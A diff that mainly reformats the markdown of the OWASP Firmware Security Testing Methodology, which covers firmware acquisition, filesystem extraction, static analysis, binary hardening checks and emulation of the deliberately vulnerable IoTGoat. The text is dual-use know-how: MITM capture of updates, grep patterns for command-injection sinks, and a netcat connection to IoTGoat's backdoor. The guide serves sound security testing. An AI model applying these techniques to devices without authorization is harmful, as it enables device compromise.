@@ -1,28 +1,28 @@
 # OWASP Firmware Security Testing Methodology
 
-![](/files/-M3ihX5oUNdoaq-0RBNP)
+!\[](/files/-M3ihX5oUNdoaq-0RBNP)
 
 Whether network connected or standalone, firmware is the center of controlling any embedded device. As such, it is crucial to understand how firmware can be manipulated to perform unauthorized functions and potentially cripple the supporting ecosystem’s security. To get started with performing security testing and reverse engineering of firmware, use the following methodology as guidance when embarking on an upcoming assessment. The methodology is composed of nine stages tailored to enable security researchers, software developers, consultants, hobbyists, and Information Security professionals with conducting firmware security assessments.
 
-| **Stage**                                   | **Description**                                                                                       |
-| ------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
-| 1. Information gathering and reconnaissance | Acquire all relative technical and documentation details pertaining to the target device's firmware   |
-| 2. Obtaining firmware                       | Attain firmware using one or more of the proposed methods listed                                      |
-| 3. Analyzing firmware                       | Examine the target firmware's characteristics                                                         |
-| 4. Extracting the filesystem                | Carve filesystem contents from the target firmware                                                    |
-| 5. Analyzing filesystem contents            | Statically analyze extracted filesystem configuration files and binaries for vulnerabilities          |
-| 6. Emulating firmware                       | Emulate firmware files and components                                                                 |
-| 7. Dynamic analysis                         | Perform dynamic security testing against firmware and application interfaces                          |
-| 8. Runtime analysis                         | Analyze compiled binaries during device runtime                                                       |
-| 9. Binary Exploitation                      | Exploit identified vulnerabilities discovered in previous stages to attain root and/or code execution |
+|**Stage**|**Description**|
+|-|-|
+|1. Information gathering and reconnaissance|Acquire all relative technical and documentation details pertaining to the target device's firmware|
+|2. Obtaining firmware|Attain firmware using one or more of the proposed methods listed|
+|3. Analyzing firmware|Examine the target firmware's characteristics|
+|4. Extracting the filesystem|Carve filesystem contents from the target firmware|
+|5. Analyzing filesystem contents|Statically analyze extracted filesystem configuration files and binaries for vulnerabilities|
+|6. Emulating firmware|Emulate firmware files and components|
+|7. Dynamic analysis|Perform dynamic security testing against firmware and application interfaces|
+|8. Runtime analysis|Analyze compiled binaries during device runtime|
+|9. Binary Exploitation|Exploit identified vulnerabilities discovered in previous stages to attain root and/or code execution|
 
-> **Note:** This firmware-specific methodology complements the [OWASP IoT Security Testing Guide (ISTG)](https://owasp.org/owasp-istg/), which provides additional test cases for hardware interfaces, wireless protocols, network services, and user interfaces. For requirements-driven security assessments, the [OWASP IoT Security Verification Standard (ISVS)](https://github.com/OWASP/IoT-Security-Verification-Standard-ISVS) defines WHAT security controls must be implemented, while FSTM defines HOW to test firmware components. Use ISVS, ISTG, and FSTM together for comprehensive IoT device security assessments.
+> \*\*Note:\*\* This firmware-specific methodology complements the \[OWASP IoT Security Testing Guide (ISTG)](https://owasp.org/owasp-istg/), which provides additional test cases for hardware interfaces, wireless protocols, network services, and user interfaces. For requirements-driven security assessments, the \[OWASP IoT Security Verification Standard (ISVS)](https://github.com/OWASP/IoT-Security-Verification-Standard-ISVS) defines WHAT security controls must be implemented, while FSTM defines HOW to test firmware components. Use ISVS, ISTG, and FSTM together for comprehensive IoT device security assessments.
 
 The following sections will further detail each stage with supporting examples where applicable. Consider visiting the [OWASP Internet of Things Project](https://owasp.org/www-project-internet-of-things/) page and GitHub repository for the latest methodology updates and forthcoming project releases.
 
 For a complementary approach covering the full IoT device attack surface beyond firmware (hardware interfaces, wireless protocols, network services, user interfaces), refer to the [OWASP IoT Security Testing Guide (ISTG)](https://owasp.org/owasp-istg/), which provides a component-based testing framework with a comprehensive test case catalog. ISTG can be used alongside FSTM's firmware-specific methodology for complete IoT device security assessments.
 
-A preconfigured Ubuntu virtual machine (EmbedOS) with firmware testing tools used throughout this document can be downloaded via the following [link](https://tinyurl.com/EmbedOS-2020). Details regarding EmbedOS' tools can be found on GitHub within the following repository <https://github.com/scriptingxss/EmbedOS>.
+A preconfigured Ubuntu virtual machine (EmbedOS) with firmware testing tools used throughout this document can be downloaded via the following [link](https://tinyurl.com/EmbedOS-2020). Details regarding EmbedOS' tools can be found on GitHub within the following repository [https://github.com/scriptingxss/EmbedOS](https://github.com/scriptingxss/EmbedOS).
 
 ### **\[Stage 1] Information gathering and reconnaissance**
 
@@ -48,11 +48,11 @@ The above listed information should be gathered prior to security testing fieldw
 
 Where possible, acquire data using open source intelligence (OSINT) tools and techniques. If open source software is used, download the repository and perform both manual as well as automated static analysis against the code base. Sometimes, open source software projects use free static analysis scanning services available for open-source projects. For example, the screenshots below show static analysis results from [Das U-Boot](https://docs.u-boot.org/)'s scans.
 
-![U-Boot Static Analysis](/files/-M3i4PAatvcctaVGCA7B)
+!\[U-Boot Static Analysis](/files/-M3i4PAatvcctaVGCA7B)
 
 Figure : U-Boot Static Analysis
 
-![](/files/-M3i4PAb-o5S7tmKnJTp)
+!\[](/files/-M3i4PAb-o5S7tmKnJTp)
 
 Figure : U-Boot Static Analysis Results
 
@@ -66,6 +66,7 @@ To begin reviewing firmware contents, the firmware image file must be acquired. 
 * Build from scratch using walkthroughs provided by the manufacturer
 * From the vendor's support site
 * Google dork queries targeted towards binary file extensions and file sharing platforms such as Dropbox, Box, and Google drive
+
   * It’s common to come across firmware images through customers who upload contents to forums, blogs, or comment on sites where they contacted the manufacturer to troubleshoot an issue and were given firmware via a zip or flash drive sent.
 * Man-in-the-middle (MITM) device communication during updates
 * \*Download builds from exposed cloud provider storage locations such as Amazon Web Services (AWS) S3 buckets
@@ -74,9 +75,10 @@ To begin reviewing firmware contents, the firmware image file must be acquired. 
 * Via a hardcoded endpoint within the mobile or thick applications
 * Dumping firmware from the bootloader (e.g. U-boot) to flash storage or over the network via tftp
 * Removing the flash chip (e.g. SPI) or MCU from the board for offline analysis and data extraction (LAST RESORT).
+
   * You will need a supported chip programmer for flash storage and/or the MCU.
 
-> \*Note: Ensure to follow local laws and regulations when downloading data from exposed cloud provider storage services.
+> \\\*Note: Ensure to follow local laws and regulations when downloading data from exposed cloud provider storage services.
 
 Each of the listed methods vary in difficulty and should not be considered an exhaustive list. Select the appropriate method according to the project objectives and rules of engagement. If possible, request both a debug build and release build of firmware to maximize testing coverage use cases in the event debug code or functionality is compiled within a release.
 
@@ -112,13 +114,14 @@ Low entropy = Not likely to be encrypted
 
 High entropy = Its likely encrypted (or compressed in some way).
 
-> **Note:** As of 2024, Binwalk v3 has been completely rewritten in Rust, providing significantly faster analysis speeds and reduced false positives compared to earlier Python-based versions. The Rust implementation offers improved memory safety, better performance on large firmware images, and enhanced support for modern compression formats and filesystems (NTFS, APFS). The command syntax remains compatible with previous versions, making it a drop-in replacement for existing workflows. Installation is available via package managers (Kali Linux, NixOS) or the Rust package manager (cargo).
+> \*\*Note:\*\* As of 2024, Binwalk v3 has been completely rewritten in Rust, providing significantly faster analysis speeds and reduced false positives compared to earlier Python-based versions. The Rust implementation offers improved memory safety, better performance on large firmware images, and enhanced support for modern compression formats and filesystems (NTFS, APFS). The command syntax remains compatible with previous versions, making it a drop-in replacement for existing workflows. Installation is available via package managers (Kali Linux, NixOS) or the Rust package manager (cargo).
 
 Alternate tools are also available using Binvis online and the standalone application.
 
 * Binvis
-  * <https://code.google.com/archive/p/binvis/>
-  * <https://binvis.io/#/>
+
+  * [https://code.google.com/archive/p/binvis/](https://code.google.com/archive/p/binvis/)
+  * [https://binvis.io/#/](https://binvis.io/#/)
 
 ### **\[Stage 4] Extracting the filesystem**
 
@@ -128,16 +131,16 @@ This stage involves looking inside firmware and parsing relative filesystem data
 
 `$ binwalk -ev <bin>`
 
-Files will be extracts to " `_binaryname/filesystemtype/`"
+Files will be extracts to " `\_binaryname/filesystemtype/`"
 
 Filesystem types: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs
 
-> **Binwalk v3 Performance Note:** The Rust-based Binwalk v3 offers substantial speed improvements during recursive extraction (`-e`) operations, particularly on large firmware images (>100MB). The verbose flag (`-v`) provides detailed extraction progress, which is especially useful for debugging extraction failures with complex or obfuscated firmware.
+> \*\*Binwalk v3 Performance Note:\*\* The Rust-based Binwalk v3 offers substantial speed improvements during recursive extraction (`-e`) operations, particularly on large firmware images (>100MB). The verbose flag (`-v`) provides detailed extraction progress, which is especially useful for debugging extraction failures with complex or obfuscated firmware.
 
 2a. Sometimes, binwalk will not have the magic byte of the filesystem in its signatures. In these cases, use binwalk to find the offset of the filesystem and carve the compressed filesystem from the binary and manually extract the filesystem according to its type using the steps below.
 
 ```
-$ binwalk DIR850L_REVB.bin
+$ binwalk DIR850L\_REVB.bin
 
 DECIMAL HEXADECIMAL DESCRIPTION
 ----------------------------------------------------------------------------- ---
@@ -151,7 +154,7 @@ DECIMAL HEXADECIMAL DESCRIPTION
 2b. Run the following dd command carving the Squashfs filesystem.
 
 ```
-$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs 
+$ dd if=DIR850L\_REVB.bin bs=1 skip=1704084 of=dir.squashfs 
 
 8257536+0 records in
 
@@ -162,7 +165,7 @@ $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 
 Alternatively, the following command could also be run.
 
-`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`
+`$ dd if=DIR850L\_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`
 
 2c. For squashfs (used in the example above)
 
@@ -180,7 +183,7 @@ Files will be in "`squashfs-root`" directory afterwards.
 
 2d. For ubifs filesystems with NAND flash
 
-`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`
+`$ ubireader\_extract\_images -u UBI -s <start\_offset> <bin>`
 
 `$ ubidump.py <bin>`
 
@@ -215,13 +218,13 @@ The following subsections introduce open source automated firmware analysis tool
 
 #### Firmwalker
 
-Execute firmwalker within it’s directory in \~/tools/firmwalker and point firmwalker to the absolute path of the extracted filesystem’s root directory. Firmwalker uses information in the "/data/” directory for parsing rules. A custom fork modified by Aaron Guzman with additional checks can be found on GitHub at <https://github.com/scriptingxss/firmwalker>. The following examples show the usage of firmwalker used on [OWASP’s IoTGoat](https://github.com/OWASP/IoTGoat). Additional vulnerable firmware projects are listed in the [Vulnerable firmware](/firmware-security-testing-methodology/readme.md) section at the end of the document.
+Execute firmwalker within it’s directory in \~/tools/firmwalker and point firmwalker to the absolute path of the extracted filesystem’s root directory. Firmwalker uses information in the "/data/” directory for parsing rules. A custom fork modified by Aaron Guzman with additional checks can be found on GitHub at [https://github.com/scriptingxss/firmwalker](https://github.com/scriptingxss/firmwalker). The following examples show the usage of firmwalker used on [OWASP’s IoTGoat](https://github.com/OWASP/IoTGoat). Additional vulnerable firmware projects are listed in the [Vulnerable firmware](/firmware-security-testing-methodology/readme.md) section at the end of the document.
 
-`$ ./firmwalker.sh /home/embedos/firmware/ _IoTGoat-rpi-2.img.extracted/squashfs-root/`
+`$ ./firmwalker.sh /home/embedos/firmware/ \_IoTGoat-rpi-2.img.extracted/squashfs-root/`
 
 See the firmwalker output below.
 
-![](/files/-M3i4PAebGSR6HOgdcTk)
+!\[](/files/-M3i4PAebGSR6HOgdcTk)
 
 Two files will be generated, firmwalker.txt and firmwalkerappsec.txt. These output files should be manually reviewed.
 
@@ -232,7 +235,7 @@ When firmware source code or decompiled binaries are available, perform static a
 1. **Memory corruption vulnerabilities** - Buffer overflows, use-after-free, and integer overflows caused by unsafe C/C++ functions
 2. **OS command injection** - Vulnerabilities where user input is passed unsafely to shell commands or system calls
 
-> **Critical Finding:** As of 2025, these vulnerability classes continue to plague devices from consumer IoT to enterprise infrastructure. Recent examples include **CVE-2024-41592** (DrayTek routers - buffer overflow in GetCGI() with CVSS 10.0), **CVE-2024-21833** (TP-Link routers - OS command injection via unsanitized country parameter), **CVE-2024-12856** (Four-Faith industrial routers - command injection in adj\_time\_year parameter), and **CVE-2025-20334** (Cisco IOS XE enterprise switches/routers - HTTP API command injection, CVSS 8.8). The impact spans from home networks to critical infrastructure: **CVE-2023-20198** (Cisco IOS XE Web UI, CVSS 10.0) resulted in 40,000-50,000 compromised enterprise network devices worldwide in October 2023. The root cause across all examples: firmware written in non-memory-safe C/C++ without modern language protections built in.
+> \*\*Critical Finding:\*\* As of 2025, these vulnerability classes continue to plague devices from consumer IoT to enterprise infrastructure. Recent examples include \*\*CVE-2024-41592\*\* (DrayTek routers - buffer overflow in GetCGI() with CVSS 10.0), \*\*CVE-2024-21833\*\* (TP-Link routers - OS command injection via unsanitized country parameter), \*\*CVE-2024-12856\*\* (Four-Faith industrial routers - command injection in adj\\\_time\\\_year parameter), and \*\*CVE-2025-20334\*\* (Cisco IOS XE enterprise switches/routers - HTTP API command injection, CVSS 8.8). The impact spans from home networks to critical infrastructure: \*\*CVE-2023-20198\*\* (Cisco IOS XE Web UI, CVSS 10.0) resulted in 40,000-50,000 compromised enterprise network devices worldwide in October 2023. The root cause across all examples: firmware written in non-memory-safe C/C++ without modern language protections built in.
 
 **Locating High-Risk Code:**
 
@@ -243,41 +246,45 @@ Prioritize SAST analysis on the following code paths most likely to expose remot
 * **System configuration utilities** - Code that modifies device settings, often accepting user input and executing system commands
 * **Network service daemons** - UPnP, SOAP, REST API endpoints that process external requests
 
-> **Pro Tip:** Use `grep -r "system\|popen\|exec" <extracted_firmware>` to quickly identify code that shells out to the operating system. Then trace backwards to find where user-controlled input enters these dangerous functions. Web server code is particularly valuable for discovering remotely exploitable command injection vulnerabilities that can lead to full device compromise.
+> \*\*Pro Tip:\*\* Use `grep -r "system\\|popen\\|exec" <extracted\_firmware>` to quickly identify code that shells out to the operating system. Then trace backwards to find where user-controlled input enters these dangerous functions. Web server code is particularly valuable for discovering remotely exploitable command injection vulnerabilities that can lead to full device compromise.
 
 The following open-source tools are specifically valuable for embedded firmware analysis:
 
 **Lightweight Scanners:**
 
 * **Cppcheck** - Static analyzer designed for embedded C/C++ projects
+
   * Detects buffer overflows, null pointer dereferences, and memory leaks
   * Supports MISRA and CERT compliance standards critical for safety-critical embedded systems
   * Handles non-standard syntax common in embedded development
   * Low false positive rate with focused bug detection
   * Installation: `apt install cppcheck` or download from [cppcheck.sourceforge.io](https://cppcheck.sourceforge.io/)
-  * Usage: `cppcheck --enable=all --addon=cert --addon=misra <source_dir>`
+  * Usage: `cppcheck --enable=all --addon=cert --addon=misra <source\_dir>`
 * **Flawfinder** - Security-focused vulnerability scanner for C/C++
+
   * **Primary use case:** Identifies dangerous function calls that enable buffer overflows and command injection
   * Flags unsafe functions: strcpy, strcat, sprintf, gets, scanf, system, popen, exec family
   * Prioritizes findings by risk level (0-5 scale)
   * Fast lexical scanning without compilation requirements
   * HTML output with vulnerability code context
   * Installation: `pip install flawfinder`
-  * Usage: `flawfinder --html --context --minlevel=4 <source_dir> > report.html`
+  * Usage: `flawfinder --html --context --minlevel=4 <source\_dir> > report.html`
   * **Best for:** Quick triage of web server code and CGI binaries for RCE vectors
 
 **Compiler-Integrated Tools:**
 
 * **Clang-Tidy** - LLVM-based linter and static analyzer
+
   * Detects memory corruption, buffer overflows, and security issues
   * Provides automated fixes for common vulnerabilities
   * Integrates with CMake and modern build systems
   * Installation: `apt install clang-tidy`
-  * Usage: `clang-tidy <source_files> -- -I<include_paths>`
+  * Usage: `clang-tidy <source\_files> -- -I<include\_paths>`
 
 **Advanced Semantic Analysis:**
 
 * **CodeQL** - Query-based code analysis engine (GitHub)
+
   * Build-free scanning for C/C++ repositories (2025 public preview)
   * Data flow analysis for tracking unsafe data propagation
   * Free for open-source firmware projects
@@ -285,11 +292,12 @@ The following open-source tools are specifically valuable for embedded firmware 
   * Installation: Download from [github.com/github/codeql-cli-binaries](https://github.com/github/codeql-cli-binaries)
   * Usage: Create database and run security queries against firmware code
 * **Semgrep** - Fast pattern-based security scanner
+
   * Scans C/C++ source without requiring buildable projects
   * Community rulesets focused on embedded/POSIX vulnerabilities
   * OSS version available (C/C++ support experimental but functional)
   * Installation: `pip install semgrep`
-  * Usage: `semgrep --config=auto <source_dir>`
+  * Usage: `semgrep --config=auto <source\_dir>`
 
 **Analysis Workflow for Maximum Impact:**
 
@@ -302,8 +310,8 @@ Use multiple SAST tools in combination, as each tool has unique analysis capabil
 
 **Target Code Paths in Priority Order:**
 
-1. `/www/cgi-bin/*` and `/htdocs/*` - Web interfaces handling HTTP requests
-2. Files containing `system()`, `popen()`, `exec*()` - Command execution code
+1. `/www/cgi-bin/\*` and `/htdocs/\*` - Web interfaces handling HTTP requests
+2. Files containing `system()`, `popen()`, `exec\*()` - Command execution code
 3. Functions with `strcpy()`, `sprintf()`, `gets()` - Buffer overflow candidates
 4. JSON/XML parsers and input validators - Data deserialization vulnerabilities
 
@@ -317,7 +325,7 @@ Fortunately, multiple open source automated firmware analysis tools are availabl
 * Extraction of firmware filesystem (s ) from images
 * Detection of certificates and private keys
 * Detection of weak implementations mapping to Common Weakness Enumeration (CWE)
-* Feed & signature-based detection of vulnerabilities
+* Feed \& signature-based detection of vulnerabilities
 * Basic static behavioral analysis
 * Comparison (diff) of firmware versions and files
 * User mode emulation of filesystem binaries using QEMU
@@ -330,29 +338,29 @@ Fortunately, multiple open source automated firmware analysis tools are availabl
 *Tip: It is recommended to run FACT with a computer that has 16 Cores 64GB RAM although the tool can run with a minimum of 4 cores and 8GB of RAM at a much slower pace. Scan output results vary on the allocated resources given to the virtual machine. The more resources, the faster FACT will complete scan submissions.*
 
 ```
-$ cd ~/tools/FACT_core/
-$ sudo ./start_all_installed_fact_components
+$ cd \~/tools/FACT\_core/
+$ sudo ./start\_all\_installed\_fact\_components
 ```
 
 Navigate to [http://127.0.0.1:5000](http://127.0.0.1:5000/) in browser
 
-![](/files/-M3i4PAfhubVQjCd0bcy)
+!\[](/files/-M3i4PAfhubVQjCd0bcy)
 
 Figure : FACT Dashboard
 
 Upload firmware components to FACT for analysis. In the screenshot below, the compressed complete firmware with its root filesystem will be uploaded and analyzed.
 
-![](/files/-M3i4PAg-B45omoGrix8)
+!\[](/files/-M3i4PAg-B45omoGrix8)
 
 Figure : FACT Upload
 
 Depending on the hardware resources given to FACT, the analysis results will appear with its scan results upon a given time. This process can take hours if minimal resources are allocated.
 
-![](/files/-M3i4PAhuT9P30U_WCdt)
+!\[](/files/-M3i4PAhuT9P30U\_WCdt)
 
 Figure : FACT IoTGoat
 
-![](/files/-M3i4PAia3qpfdmwAqIM)
+!\[](/files/-M3i4PAia3qpfdmwAqIM)
 
 Figure : FACT IoTGoat Exploit Mitigation Results
 
@@ -360,26 +368,33 @@ Disassemble suspect target binaries with data gathered from FACT using free and 
 
 The following screenshot shows the “shellback” binary disassembled using Ghidra.
 
-![](/files/-M3i4PAjBP2Y0kvZrD6l)
+!\[](/files/-M3i4PAjBP2Y0kvZrD6l)
 
 Figure : Shellback Ghidra Analysis
 
 Common binary analysis consist of reviewing the following:
 
 * Stack canaries enabled or disabled
-  * `$ readelf -aW bin/*| grep stack_chk_fail`
-  * `$ mips-buildroot-linux-uclibc-objdump -d bin/binary | grep stack_chk_fail`
+
+  * `$ readelf -aW bin/\*| grep stack\_chk\_fail`
+  * `$ mips-buildroot-linux-uclibc-objdump -d bin/binary | grep stack\_chk\_fail`
 * Position-independent executable (PIE) enabled or disabled
+
   * PIE disabled
-    * `$ readelf -h <bin> | grep -q 'Type:[[:space:]]*EXEC'`
+
+    * `$ readelf -h <bin> | grep -q 'Type:\[\[:space:]]\*EXEC'`
   * PIE enabled
-    * `$ readelf -h <bin> | grep 'Type:[[:space:]]*DYN'`
+
+    * `$ readelf -h <bin> | grep 'Type:\[\[:space:]]\*DYN'`
   * DSO
+
     * `$ readelf -d <bin> | grep -q 'DEBUG'`
   * Symbols
+
     * `$ readelf --syms <bin>`
     * `$ nm <bin>`
 * Recognizable strings
+
   * `-el` specifies little-endian characters 16-bits wide (e.g. UTF-16).
   * Use `-eb` for big endian
   * Prints any ASCII strings longer than 16 to stdout
@@ -391,14 +406,15 @@ Common binary analysis consist of reviewing the following:
   * `strings -n16 <bin>`
   * `strings -tx <bin>`
 * Non-executable (NX) enabled or disabled
+
   * `$ readelf -lW bin/<bin>| grep STACK`
 
-`GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4`
+`GNU\_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4`
 
 The 'E' indicates that the stack is executable.
 
 ```
-$ execstack bin/*
+$ execstack bin/\*
 
 X bin/ash
 
@@ -406,30 +422,33 @@ X bin/busybox
 ```
 
 * Relocations read-only (RELRO) configuration
+
   * Full RELRO:
-    * `$ readelf -d binary | grep BIND_NOW`
+
+    * `$ readelf -d binary | grep BIND\_NOW`
   * Partial RELRO:
-    * `$ readelf -d binary | grep GNU_RELRO`
+
+    * `$ readelf -d binary | grep GNU\_RELRO`
 
 A script that automates checking many of the above binary properties is [checksec.sh](https://github.com/slimm609/checksec.sh). Below, are two examples of using the script.
 
 ```
-> ./checksec --file=/home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/bin/busybox
+> ./checksec --file=/home/embedos/firmware/\_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/bin/busybox
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    Symbols        FORTIFY    Fortified    Fortifiable  FILE
-Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No    0        0    /home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/bin/busybox
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No    0        0    /home/embedos/firmware/\_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/bin/busybox
 ```
 
 ```
-> ./checksec --file=/home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/usr/bin/shellback
+> ./checksec --file=/home/embedos/firmware/\_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/usr/bin/shellback
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    Symbols        FORTIFY    Fortified    Fortifiable  FILE
-Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No    0        0    /home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/usr/bin/shellback
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No    0        0    /home/embedos/firmware/\_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/usr/bin/shellback
 ```
 
-![](/files/-M3i4PAks21G4CIRxCb1)
+!\[](/files/-M3i4PAks21G4CIRxCb1)
 
 Figure : Checksec.sh
 
-For Microsoft binaries (EXE & DLL), use [PESecurity](https://github.com/NetSPI/PESecurity) to check for ASLR, DEP, SafeSEH, StrongNaming, Authenticode, Control Flow Guard, and HighEntropyVA.
+For Microsoft binaries (EXE \& DLL), use [PESecurity](https://github.com/NetSPI/PESecurity) to check for ASLR, DEP, SafeSEH, StrongNaming, Authenticode, Control Flow Guard, and HighEntropyVA.
 
 #### EMBA - Embedded Analyzer
 
@@ -451,6 +470,7 @@ For Microsoft binaries (EXE & DLL), use [PESecurity](https://github.com/NetSPI/P
 * Detection of binary mitigations such as NX, DEP, ASLR, stack canaries, RELRO, and FORTIFY\_SOURCE
 * Detection of legacy binary functions (e.g. strcpy)
 * **Software Bill of Materials (SBOM) generation** - As of 2024, EMBA evolved to include comprehensive SBOM capabilities critical for regulatory compliance and vulnerability management
+
   * Generates reproducible and accurate SBOMs for firmware analysis
   * Works with systems lacking traditional package managers (essential for embedded devices)
   * Supports multiple package manager environments simultaneously
@@ -489,36 +509,36 @@ You should use the `-d` switch with the installer to run a typical installation.
 After the installation process is finished, it is possible to use *EMBA* for firmware security analysis from the command line. Before starting *EMBA* please download a testing firmware like the [OWASP IoTGoat firmware](https://github.com/OWASP/IoTGoat). The following command shows a typical *EMBA* command:
 
 ```bash
-sudo ./emba.sh -f ~/IoTGoat-x86.img.gz -l ~/emba_logs_iotgoat -p ./scan-profiles/default-scan.emba
+sudo ./emba.sh -f \~/IoTGoat-x86.img.gz -l \~/emba\_logs\_iotgoat -p ./scan-profiles/default-scan.emba
 ```
 
 The shown command configures the following basic options:
 
-* -f - Firmware file
-* -l - Directory for logs
-* -p - Scan profile to use (located in ./scan-profiles)
+* \-f - Firmware file
+* \-l - Directory for logs
+* \-p - Scan profile to use (located in ./scan-profiles)
 
 Further options are available and can be viewed via `./emba.sh -h`
 
 The first step of every firmware test is a health check of the current installation:
 
-![](/files/Dy8220gaJ4bG8hwu9QHN)
+!\[](/files/Dy8220gaJ4bG8hwu9QHN)
 
 After the health check was successful the analysis process starts with identification and extraction of the configured firmware:
 
-![](/files/A0TroHVj4cMnlIdx0Obn)
+!\[](/files/A0TroHVj4cMnlIdx0Obn)
 
 While testing the firmware, all the results and the current status is shown live in the terminal. As a typical scan will run in threaded mode (*`-t` parameter*), this output will be garbled and not very easy to read. For further analysis it is recommend to use the generated text based log files in the log directory and the web report (*`-W` parameter*). After finishing the firmware scan, *EMBA* shows a summary of the results in the terminal:
 
-![](/files/NxDMr5fRoV4zsp1nDwaG)
+!\[](/files/NxDMr5fRoV4zsp1nDwaG)
 
 Further results are available in the log directory and can be analyzed on the command line or via the web-browser:
 
 ```bash
-firefox ~/emba_logs_iotgoat/html-report/index.html
+firefox \~/emba\_logs\_iotgoat/html-report/index.html
 ```
 
-![](/files/4hHKEVB6fJlfxj2owRdE)
+!\[](/files/4hHKEVB6fJlfxj2owRdE)
 
 The generated HTML report is self-contained and can be shared easily. Furthermore, this report is fully interactive and it is possible to reach all the testing details through the aggregated summary dashboard.
 
@@ -530,15 +550,15 @@ Further details are available on the official [*EMBA git repository*](https://gi
 
 Furthermore *EMBArk* improves the data provision by aggregating the various scanning results in an [aggregated management dashboard](https://github.com/e-m-b-a/embark/wiki/Web-interface#main-dashboard).
 
-![](/files/erki9AJHhSOvMWau2nSY)
+!\[](/files/erki9AJHhSOvMWau2nSY)
 
 On the details page of all scans you can access the detailed report of a firmware scan, start further tests and download the scan logs:
 
-![](/files/f43mkyb2RaixsGJXC60U)
+!\[](/files/f43mkyb2RaixsGJXC60U)
 
 More details with the main results of each firmware test are available in the detailed report:
 
-![](/files/LOHh3zPyd9P0ldzY2DC8)
+!\[](/files/LOHh3zPyd9P0ldzY2DC8)
 
 More information is available on the official [*EMBArk git repository*](https://github.com/e-m-b-a/embark).
 
@@ -570,7 +590,7 @@ A comprehensive firmware SBOM enables:
 EMBA's SBOM generation provides comprehensive component tracking specifically designed for firmware analysis. The following example demonstrates SBOM generation during a standard EMBA firmware scan:
 
 ```bash
-sudo ./emba.sh -f firmware.bin -l ~/emba_logs -p ./scan-profiles/default-scan.emba
+sudo ./emba.sh -f firmware.bin -l \~/emba\_logs -p ./scan-profiles/default-scan.emba
 ```
 
 EMBA automatically generates SBOM data as part of its analysis process, including:
@@ -606,7 +626,7 @@ Ensure firmware SBOMs include the following minimum elements as defined by CISA:
 * **SBOM Author** - Name of the entity creating the SBOM
 * **Timestamp** - Record of the date and time of SBOM creation
 
-Reference: <https://www.cisa.gov/sbom>
+Reference: [https://www.cisa.gov/sbom](https://www.cisa.gov/sbom)
 
 **SBOM Tools and Formats**
 
@@ -643,7 +663,7 @@ eb - big endian
 Binwalk can be used identify endianness for packaged firmware binaries (not from binaries within extracted firmware) using the command below.
 
 ```
-$ binwalk -Y UPG_ipc8120p-w7-M20-hi3516c-20160328_165229.ov
+$ binwalk -Y UPG\_ipc8120p-w7-M20-hi3516c-20160328\_165229.ov
 
 DECIMAL HEXADECIMAL DESCRIPTION
 
@@ -663,7 +683,7 @@ Copy the applicable QEMU binary into the extracted root filesystem. The second c
 ```
 > cp /usr/local/qemu-arch /extractedrootFS/
 
-/home/embedos/firmware/_DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted.extracted/squashfs-root 
+/home/embedos/firmware/\_DIR850L\_REVB\_FW207WWb05\_h1ke\_beta1.decrypted.extracted/squashfs-root 
 > cp /usr/bin/qemu-arm-static .
 ```
 
@@ -675,10 +695,10 @@ The following example shows Busybox emulated within a typical x64 architecture a
 
 ```
 > sudo chroot . ./qemu-arm-static bin/busybox ls
-[sudo] password for embedos: 
+\[sudo] password for embedos: 
 bin               etc               overlay           rom               sys               var
 dev               lib               proc              root              tmp               www
-dnsmasq_setup.sh  mnt               qemu-arm-static   sbin              usr
+dnsmasq\_setup.sh  mnt               qemu-arm-static   sbin              usr
 ```
 
 Below, is an example of emulating a service that listens on port 5515.
@@ -690,7 +710,7 @@ Below, is an example of emulating a service that listens on port 5515.
 Also, the same service can be emulated with qiling framework.
 
 ```
-> ./qltool run --console False -f ~/_IoTGoat-x86.img.extracted/squashfs-root/usr/bin/shellback --rootfs ~/_IoTGoat-x86.img.extracted/squashfs-root
+> ./qltool run --console False -f \~/\_IoTGoat-x86.img.extracted/squashfs-root/usr/bin/shellback --rootfs \~/\_IoTGoat-x86.img.extracted/squashfs-root
 ```
 
 In another terminal, check if the service is listening locally and try to connect to it with netcat.
@@ -698,22 +718,22 @@ In another terminal, check if the service is listening locally and try to connec
 ```
 > sudo lsof -i :5515
 COMMAND     PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
-qemu-arm- 13264 root    3u  IPv4 662221      0t0  TCP *:5515 (LISTEN)
+qemu-arm- 13264 root    3u  IPv4 662221      0t0  TCP \*:5515 (LISTEN)
 > nc -nv 127.0.0.1 5515
-Connection to 127.0.0.1 5515 port [tcp/*] succeeded!
-[***]Successfully Connected to IoTGoat's Backdoor[***]
+Connection to 127.0.0.1 5515 port \[tcp/\*] succeeded!
+\[\*\*\*]Successfully Connected to IoTGoat's Backdoor\[\*\*\*]
 ```
 
